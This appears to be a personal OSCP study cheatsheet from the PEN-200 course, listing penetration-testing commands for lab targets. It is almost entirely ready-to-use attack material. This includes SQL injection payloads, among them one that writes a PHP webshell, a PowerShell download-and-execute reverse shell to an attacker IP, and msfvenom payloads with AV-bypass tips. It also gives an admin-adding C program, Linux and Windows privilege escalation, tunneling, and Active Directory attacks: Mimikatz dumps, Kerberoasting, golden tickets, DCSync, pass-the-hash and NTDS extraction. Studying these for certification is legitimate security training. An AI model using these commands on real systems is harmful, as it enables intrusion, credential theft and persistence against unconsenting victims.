# OSCP-Notes
Cheatsheet/Notes from PEN-200 Learning Platform for the OSCP Exam

Things that we should look for on a system:
    - Username and hostname
    - Group memberships of the current user
    - Existing users and groups
    - Operating system, version and architecture
    - Network information
    - Installed applications
    - Running processes


Transfer File From Windows To Linux via ssh:
    1.on linux 2. on windows:
    
        1. sudo systemctl start ssh
        2. scp C:\Users\offsec\Desktop\malware.exe shaleph@192.168.45.162:/home/shaleph/OSCP 
        
file metadata analyzer:

    exiftool -a -u <file.name>
  
Web App Pentest

    Command Injection
      Check if CMD or PowerShell we have:
        (dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
      PowerCat for Reverse shell. first copy to local dir: 
        cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .


  SQLi
    MySQL:
      connect to mysql remotely:
      
        mysql -u <user> -h <ip> -P 3306 -p;
        
  commands after connection:
      
        show databases;
        select version();
        show tables in mysql;
        select * from mysql.user;
        select * from mysql.user where user = 'username';
        
  MSSQL:
      connect:
      
        impacket-mssqlclient <user>:<pass>@<ip> -windows-auth
  commnads:
  
        select @@version;
        select name from sys.databases;
        select * from <db_name>.information_schema.tables;
        select * from master.dbo.sysusers;

  Injections: 
  
      offsec' OR 1=1 -- //
      if above successful:
            ' or 1=1 in (select @@version) -- //
            
  UNION injections:
      first get number of columns (increase number by 1):
      
        ' ORDER BY 1-- //
        ' UNION SELECT null, null, database(), user(), @@version  -- //
        ' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
      shell with Union
        ' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //

  Time Based Blind SQL:
      ' AND IF (1=1, sleep(3),'false') -- //

Anti-Virus Bypass Tools (AV Bypass) : 
    1.shellter (obfuscating and inserting payloads in file normal files) 
    2.vail - obfuscating payload codes themselfs
    Reccomendation: Use the meterpreter reverse shells and run msfconsole listener below. (adjust ofc)

Msfconsole Listener:

        msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"

Payload Generator msfvenom:

    msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe > binary.exe

Execution Policy on Windows:

    Get-ExecutionPolicy -Scope CurrentUser
    Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
    ExecutionPolicy -bypass
    
        
Download and execute in PowerShell:

    IEX(New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
Just Download on windows:
    
    iwr -uri http://192.168.45.182/winPEASx64.exe -Outfile winPEAS.exe
    IEX(New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1")

Windows Privesc:
    Enum:
        Users and Groups:
        
            whoami
            whoami /groups
            Get-LocalUser (In PS)
            net user <username>
            Get-LocalGroup
            Get-LocalGroupMember <groupname>
        System:
            systeminfo
        Network:
            ipconfig /all
            route print
            netstat -ano (active TCP connections and ports)
        Installed Apps:
            Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
            Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
        Running Processes:
            Get-Process
        Running proccess only on RDP (if no high permission)
            Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
        Running processes for DLL hijack and unquoted service path attacks (both running and stopped processes (cant use stopped for DLL and service binary hijack):
            wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
        Check for file permissions:
            icacls "C:\xampp\apache\bin\httpd.exe"
        Search for files:
            Get-ChildItem -Path C:\ -Include *.<file.extention> -File -Recurse -ErrorAction SilentlyContinue

        Commands Executed by user:
            Get-History
            (Get-PSReadlineOption).HistorySavePath

        Run Commands as differnt user ( when we already know password and we are running RDP):
            runas /user:backupadmin cmd

    Abusin Scheduled Tasks:
        Display Tasks:
            schtasks /query /fo LIST /v
            Get-ScheduledTask

Cross compileing c program into binary for 64bit Windows in Kali

        x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
        code inside:
            #include <stdlib.h>
            
            int main ()
            {
              int i;
              
              i = system ("net user dave2 password123! /add");
              i = system ("net localgroup administrators dave2 /add");
        
              return 0;
            }

Linux Privilege Escalation:
    Manual Enumeration of OS:
        User context information:

            id
            cat /etc/passwd
            hostname
            env
        System information:
            cat /etc/issue
            cat /etc/os-release
            uname -a
        Running Processes:
            ps aux
            watch -n 1 "ps -aux | grep pass" (run ps aux every 1 second and search for word pass)
        Network info:
            ifconfig a
            ip a
            route
            routel
        For active listening ports and network connections:
            netstat -anp
            ss -anp
        Firewall Rules:
            iptables (requires root access)
            cat /etc/iptables/rules.v4 (may have access missconfigured)

        Scheduled Tasks (crons)
            ls -lah /etc/cron*
            crontab -l (list jobs for current user)
            grep "CRON" /var/log/syslog

        List apps:
            dpkg -l
        list directories that user has perrmissions on:
            find / -writable -type d 2>/dev/null

        Checking Drives and mounted filesystems:
            cat /etc/fstab
            mount
            lsblk (available disks)
        Loaded kernel modules:
            lsmod
            /sbin/modinfo <loaded module name>
        Search for SUID marked bineries:
            find / -perm -u=s -type f 2>/dev/null
        Network Traffic Capture (Requires sudo privileges)
            sudo tcpdump -i lo -A | grep "pass"

        Generate password for /etc/passwd (if writeable perrmisions)
            openssl passwd <password>
        If Any commands have SUID flag (written "s" in ls -asl (/usr/bin/ is the directory for them)):
            find /home/joe/Desktop -exec "/usr/bin/bash" -p \; (find example)
        Search for Binaries with CAPABILITIES:
            /usr/sbin/getcap -r / 2>/dev/null IF ANYthing is found with setuid+ep (effective and permitted) search on GTFOBins and then capabilities inside
        SUDO abuse:
            sudo -l and if any command appears do same thing as above about GTFOBins but sudo section
            
    Automated Testing:
        ./unix-privesc-check standard > output.txt (first download unix-privesc-check on target machine)
Password Shit:
        Hydra:

            hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.211.202
            hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"


PORT FORWARDING AND SSH TUNNELING
    always:
        python3 -c 'import pty;pty.spawn("/bin/bash")'
    Port Forwarding:

            socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432

        scan local ips (that we get with ip route) with specific port with for loop in bash:
            for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done

    SSH Local Tunneling:
            ssh -N -L 0.0.0.0:4455:172.16.200.217:445 database_admin@10.4.200.215
        check ports on listening machine:
            ss -ntplu
    Dynamic Tunneling:
            ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215

SSH Remote Port Forwarding:
    on compromised machine ssh to our machine:
        on our machine:
            sudo systemctl start ssh
        con compromised:
        
        python3 -c 'import pty;pty.spawn("/bin/bash")'
        ssh -N -R 127.0.0.1:2345:10.4.200.215:5432 shaleph@192.168.45.193
SSH Dynamic Remoet Port Forwarding:
    first change proxychains :
        
        sudo nano /etc/proxychains4.conf
        socks5 127.0.0.1 9998 (on last line)
    Then on compromised machine:
        python3 -c 'import pty;pty.spawn("/bin/bash")'
        ssh -N -R 9998 sshaleph@192.168.45.225
Using SSHUTTLE:
    first we set up socat on compromised machine (requers root ssh and root python pty) and next:
    
        socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
        sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24

On Windows: 
    With SSH it is the same. in cmd "where ssh.exe" and use as usual if its there:
        ssh -N -R 9998 kali@192.168.118.4
        fix proxychains after
    Plink:

            plink.exe -ssh -l shaleph -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.255
    Netsh:
        netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
        Check if listening:
            netstat -anp TCP | find "2222"
            netsh interface portproxy show all
        Make hole to to avoid firewall restriction:
            netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
        Delete the rule and port forward after done:
            netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
            netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64

HTTP Tunneling:
    Chisel: Get chisel on both compromised and local
    local:
    if error use: https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz 
    
        chisel server --port 8080 --reverse (on local)
        sudo tcpdump -nvvvXi tun0 tcp port 8080 (log incoming traffic)
    on client:
        /tmp/chisel client 192.168.45.225:8080 R:socks > /dev/null 2>&1 &
        /tmp/chisel client 192.168.45.225:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://192.168.45.225:8080/
    and to connect with ncat use this on our kali:
        ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.243.215


METASPLOET:
    add different workspaces for different pentests:
    
        workspace -a pen200
    discovered hosts:
        hosts
    discovered services and ports:
        services
        services -p 8000
    for background:
        run -j
        jobs
        sessions (shows sessions)
        sessions -i 12 (choose a session)
        
after running Auxiliary module on a target, we can leverage vulns option by just typing: vulns
after exploit crtl+z to send session in backround
sessions -l to list sessions

To list available payloads for the exploit:

    show payloads
if we choose meterpreter payload use "help" after gaining shell to see available meterpreter commands

Generate Payloads with msfvenom:

    list:
        msfvenom -l payloads --platform windows --arch x64
    create:
        msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.2 LPORT=443 -f exe -o nonstaged.exe
    Multihandler in msfconsole instead of netcat:
        use multi/handler
        set payload windows/x64/shell/reverse_tcp

Meterpreter post-explo:

    idletme
    shell
    getsystem
    ps -> migrate <pid>
    execute -H -f notepad -> migrate <notepad pid>

    load kiwi (mimikatz but for metasploit)

pivoting with metasploit:
    run multi/handler on background with bg:

        bg
        route add 172.16.5.0/24 12
        route print
        use auxiliary/scanner/portscan/tcp 
    after discovering that ports are open:
        use exploit/windows/smb/psexec

    use msf as a tunnel:
        use multi/manage/autoroute
        set multihandler session and run

        use auxiliary/server/socks_proxy
        set SRVHOST 127.0.0.1
        set VERSION 5
        run -j
        then update proxychains conf to socks5 127.0.0.1 1080
        then use as u want. e.g:
        sudo proxychains xfreerdp /v:172.16.5.200 /u:luiza
    can do the port forward with multi handler session:
        portfwd add -l 3389 -p 3389 -r 172.16.5.200
        sudo xfreerdp /v:127.0.0.1 /u:luiza

metasploit autorun scripts:
    ls -l /usr/share/metasploit-framework/scripts/resource
    to run any:
    sudo msfconsole -r scipt.rc

ACTIVE DIRECTORY:
    Enum:

        net user /domain
        net user <username> /domain
        net group /domain
        net group "group name" /domain

        [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() (chech pdcroleowner)
        to automate:
            $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            powershell -ep bypass
            in a ps1 file (created via powershell ISE):
                # Store the domain object in the $domainObj variable
                $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()                
                # Store the PdcRoleOwner name to the $PDC variable
                $PDC = $domainObj.PdcRoleOwner.Name                
                # Store the Distinguished Name variable into the $DN variable
                $DN = ([adsi]'').distinguishedName           
                $LDAP = "LDAP://$PDC/$DN"
                $direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)           
                $dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)
                $dirsearcher.filter="samAccountType=805306368"
                $result = $dirsearcher.FindAll()
                Foreach($obj in $result)
                {
                    Foreach($prop in $obj.Properties)
                    {
                        $prop
                    }                
                    Write-Host "-------------------------------"
                }

                we can filter by the name:
                    $dirsearcher.filter="name=jeffadmin"
                    and change loop:
                        $prop.memberof
        PowerView:
            PS C:\Tools> Import-Module .\PowerView.ps1
            Get-NetDomain
            Get-NetUser
            Get-NetUser | select cn
            Get-NetUser | select cn,pwdlastset,lastlogon
            Get-NetGroup | select cn
            Get-NetGroup "Sales Department" | select member

            Get-NetComputer
            Get-NetComputer | select operatingsystem,dnshostname
        privs
            Find-LocalAdminAccess
            Get-NetSession -ComputerName files04 -Verbose
        PsLoggon:
            .\PsLoggedon.exe \\client74
        Get IP throu running application:
            setspn -L iis_service
            Get-NetUser -SPN | select samaccountname,serviceprincipalname4
            nslookup.exe <web04.corp.com>
        ACL Rights:
            Get-ObjectAcl -Identity stephanie
            Convert-SidToName <sid>
            Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
            "SID1","SID2","SID3"..  | Convert-SidToName
        If compromised user has GenericAll permissions, we can add users to domain:
            net group "Domain Admins" stephanie /add /domain
            Get-NetGroup "Management Department" | select member
            net group "Management Department" stephanie /del /domain
        Domain Shares Enum:
            Find-DomainShare
            Find-DomainShare -CheckShareAccess
            ls \\dc1.corp.com\sysvol\corp.com\

        BloodHound:
            download sharphound on compromised windows
            import-module .\sharphound.ps1
            Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"

Atak:
    Mimi:

        privilege::debug
        sekurlsa::logonpasswords
        sekurlsa::tickets

    Password Attacks:
        net accounts (for lockout info)
        crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
        Kerbrute:
            .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
    AS-REP Roasting:
        Get-DomainUser -PreauthNotRequired
        On Linux:
            impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
        on WIndows:
            .\Rubeus.exe asreproast /nowrap
    Kerberoasting:
        Win:
            .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
        Lin:
            sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete 
    Silver Tickets:
        gotta collect SPN Password hash, Domain SID, Target SPN
        1. Mimikatz ntlm hash: privilege::debug sekurlsa::logonapsswords
        2. whoami /user ( except last 4 digits, we just need domain SID )
        3. target SPN: server name + domain name: web04.corp.com
        kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
    DCSYNC:
        Win:
            mimi:
            lsadump::dcsync /user:corp\dave
        Lin:
            impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70

AD Lateral Movement:
    WMI and WinRS:

    psexec:
        Lin:   
            psexec.py jen@192.168.248.72
            psexec.py jen@192.168.248.72 -hashes LMHASH:NTHASH
        Win:
            ./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
    PassTheHash:
        impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
    Overpass The Hash:
        sekurlsa::pth /user:administrator /domain:corp.com /ntlm:2892D26CDF84D7A70E2EB3B9F05C425E /run:powershell 
        net use \\files04 (or any other command that creates TGS)
        cd C:\tools\SysinternalsSuite\
        .\PsExec.exe \\files04 cmd
        klist (shows cached kerberos tickets)
    Pass The Ticket:
        sekurlsa::tickets /export
        dir *.kirbi
        kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
    DCOM:
        in admin powershell:
            $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<target_ip>"))
            $dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
    Persistence:
        Golden (lsadump::lsa /patch from Domain Controller priviledged account):
            kerberos::purge
            kerberos::golden /user:jen /domain:corp.com /sid:<domain_sid> /krbtgt:<krbtgt_ntlm> /ptt
            misc::cmd
            PsExec.exe \\dc1 cmd.exe
    Shadow Copiez:
        again from domain controller elevated user
            vshadow.exe -nw -p  C:
            copy <shadow copy device name> c:\ntds.dit.bak
            reg.exe save hklm\system c:\system.bak
        Then download files and run this on our kali:
            impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
